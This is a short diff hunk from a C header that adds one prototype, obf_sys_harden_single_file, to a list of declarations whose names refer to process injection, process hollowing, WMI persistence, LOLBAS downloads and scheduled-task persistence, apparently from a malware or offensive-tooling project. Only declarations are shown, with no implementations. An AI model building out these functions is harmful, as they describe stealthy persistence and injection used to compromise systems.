@@ -38,6 +38,7 @@ void obf_sys_inject_process(void);
 void obf_sys_hollow_process(void);
 void obf_sys_wmi_persistence(void);
 void obf_sys_harden_files(void);
+void obf_sys_harden_single_file(const char *filename);
 void obf_sys_lolbas_download(const char *url, const char *outPath);
 void obf_ensure_scheduled_task(const char *exePath, const char *taskName);
 
